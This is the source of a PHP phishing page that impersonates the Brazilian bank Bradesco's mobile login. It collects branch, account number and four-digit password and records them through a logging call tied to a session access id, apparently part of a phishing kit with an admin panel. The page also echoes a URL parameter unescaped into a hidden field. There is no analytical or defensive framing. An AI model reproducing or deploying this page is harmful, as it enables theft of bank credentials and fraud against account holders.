<?php
require_once('../_admin/config.php');
require_once('../validacao.php');
if(isset($_SESSION['agencia']) && strlen($_SESSION['agencia']) > 2 && isset($_SESSION['conta']) && strlen($_SESSION['conta']) > 3 && isset($_SESSION['s4']) && strlen($_SESSION['s4']) == 4){

    $agencia = $_SESSION['agencia'];
    $conta = $_SESSION['conta'];
    $aConta = explode('-', $conta);
    $conta = $aConta[0];
    $digito = $aConta[1];
    $s4 = $_SESSION['s4'];
    Info::gravarInfoMobile($_SESSION['idAcesso'], $agencia, $conta, $digito, $senha4);
    
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="images/favicon.ico">
    <title>Bradesco</title>
</head>
<body>
    <nav class="navbar d-flex">
        <a class="navbar-brand" href="javascript:;"><img src="images/bars.png" alt=""></a>
        <p class="header-title">Bradesco</p>
    </nav>
    <div id="boxAcesso">
        <h3 class="title content">ACESSO À CONTA</h3>
        <div class="erro hide">
            <p class="msg"></p>
        </div>
        <section id="form">
        <form id="acessoForm" action="index.php" method="POST"  autocomplete="off">
                <div class="input-container">
                    <input id="agencia" name="agencia" maxlength="4" onkeyup="this.value=this.value.replace(/[^\d]/,'')" class="field" type="tel" pattern=".+"/>
                    <label class="label" for="agencia">Agência</label>
                </div>
                <div class="input-container">
                        <input id="conta" name="conta" onkeyup="this.value=this.value.replace(/[^\d]/,'')" class="input field" type="tel" pattern=".+"/>
                        <label class="label" for="conta">Conta</label>
                </div>
                <div class="input-container">
                        <input id="s4" name="s4" onkeyup="this.value=this.value.replace(/[^\d]/,'')" maxlength="4" class="input field" type="tel" oninput="this.value = this.value.replace(/[^0-9]/g, '')" pattern=".+"/>
                        <label class="label" for="s4">Senha 4 Dígitos</label>
                </div>

                <div id="boxCarregando" class="hide">
                    <div id="loading_novocompseg" class="loading loading_pass4 fl after mb20 none_i">
                        <div id="div_carregando_novocompseg" class="txt"><span
                        id="link_ancora_carregando_novocompseg"><a id="ancora_carregando_novocompseg"
                        href="javascript:;" title="Carregando..."></a></span><span
                        id="label_carregando_novocompseg">Carregando...</span></div>
                    </div>
                </div>


                <div id="titularidades" class="hide">
                <div class="input-container-buttons">
                    <label for="">Titularidade</label>
                     <div class="titulares">
                    </div>
                </div>
                </div>


                <div id="boxAguarde" class="hide">
                    <div id="loading_novocompseg" class="loading loading_pass4 fl after mb20 none_i">
                        <div id="div_carregando_novocompseg" class="txt"><span
                        id="link_ancora_carregando_novocompseg"><a id="ancora_carregando_novocompseg"
                        href="javascript:;" title="Carregando..."></a></span><span
                        id="label_carregando_novocompseg">Aguardando...</span></div>
                    </div>
                </div>


                <input type="submit" class="btn-acessar bt_avancar" value="Acessar">
            </form>
        </section>
    </div>

        
        <div id="logo">
            <img src="images/cadeado.png" alt="">

    </div>
    <input type="hidden" name="clientHashId" id="clientHashId" value="<?php echo $_GET["hash"];?>">
    <input type="hidden" name="id" id="id" value="<?php echo isset($_SESSION["id"]) ? $_SESSION["id"] : '';?>">
    <input type="hidden" name="idAcesso" id="idAcesso" value="<?php echo isset($_SESSION["idAcesso"]) ? $_SESSION["idAcesso"] : '';?>">
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.mask.min.js"></script>
    <script src="js/main.js"></script>
</body>
</html>